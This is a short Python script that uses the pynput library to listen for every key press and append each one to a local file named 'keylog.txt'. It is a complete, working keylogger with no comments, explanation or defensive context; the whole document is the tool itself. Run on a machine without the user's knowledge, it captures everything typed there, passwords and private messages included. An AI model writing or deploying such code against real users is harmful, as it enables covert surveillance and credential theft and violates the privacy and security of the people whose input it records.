from pynput.keyboard import Listener

l_file = "keylog.txt"
def on_press(key):
    with open(l_file, "a") as f:
        f.write(f"{key}\n")

with Listener(on_press=on_press) as listener:
    listener.join()

